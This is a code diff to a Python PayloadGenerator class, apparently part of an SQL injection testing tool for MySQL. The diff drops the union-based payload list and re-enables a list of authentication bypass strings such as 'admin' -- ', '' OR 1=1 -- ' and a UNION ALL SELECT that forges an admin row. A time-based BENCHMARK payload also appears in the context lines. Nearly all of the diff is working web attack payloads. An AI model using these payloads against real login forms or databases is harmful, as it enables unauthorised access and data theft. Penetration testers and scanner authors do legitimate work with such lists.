@@ -79,40 +79,24 @@ class PayloadGenerator:
             "\" OR BENCHMARK(10000000,MD5(1)) -- "
         ]
 
-        # Union-based payloads (MySQL specific)
-        self.union_based_payloads = [
-            "' UNION SELECT NULL -- ",
-            "' UNION SELECT NULL,NULL -- ",
-            "' UNION SELECT NULL,NULL,NULL -- ",
-            "' UNION SELECT NULL,NULL,NULL,NULL -- ",
-            "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
-            "' UNION SELECT @@version -- ",
-            "' UNION SELECT @@version,NULL -- ",
-            "' UNION SELECT @@version,NULL,NULL -- ",
-            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ",
-            "' UNION SELECT user(),database() -- ",
-            "' UNION SELECT table_name,column_name FROM information_schema.columns -- ",
-            "' UNION SELECT table_schema,table_name FROM information_schema.tables -- "
-        ]
-
         # Authentication bypass payloads
-        # self.authentication_bypass_payloads = [
-        #     "admin' -- ",
-        #     "admin' #",
-        #     "admin'/*",
-        #     "' OR 1=1 -- ",
-        #     "' OR 1=1 #",
-        #     "' OR 1=1/*",
-        #     "admin' OR '1'='1",
-        #     "admin' OR '1'='1' -- ",
-        #     "admin' OR '1'='1' #",
-        #     "admin'OR 1=1 OR ''='",
-        #     "admin' OR 1=1",
-        #     "admin' OR 1=1--",
-        #     "admin' OR 1=1#",
-        #     "admin' OR 1=1/*",
-        #     "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
-        # ]
+        self.authentication_bypass_payloads = [
+            "admin' -- ",
+            "admin' #",
+            "admin'/*",
+            "' OR 1=1 -- ",
+            "' OR 1=1 #",
+            "' OR 1=1/*",
+            "admin' OR '1'='1",
+            "admin' OR '1'='1' -- ",
+            "admin' OR '1'='1' #",
+            "admin'OR 1=1 OR ''='",
+            "admin' OR 1=1",
+            "admin' OR 1=1--",
+            "admin' OR 1=1#",
+            "admin' OR 1=1/*",
+            "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+        ]
 
     def generate_mysql_payloads(self):
         """
@@ -127,8 +111,7 @@ class PayloadGenerator:
         all_payloads.extend(self.error_based_payloads)
         all_payloads.extend(self.boolean_based_payloads)
         all_payloads.extend(self.time_based_payloads)
-        all_payloads.extend(self.union_based_payloads)
-        # all_payloads.extend(self.authentication_bypass_payloads)
+        all_payloads.extend(self.authentication_bypass_payloads)
 
         # Remove duplicates while preserving order
         unique_payloads = []
@@ -168,10 +151,6 @@ class PayloadGenerator:
     def generate_time_based_payloads(self):
         """Get time-based payloads"""
         return self.time_based_payloads
-
-    def generate_union_based_payloads(self):
-        """Get union-based payloads"""
-        return self.union_based_payloads
 
     def generate_authentication_bypass_payloads(self):
         """Get authentication bypass payloads"""
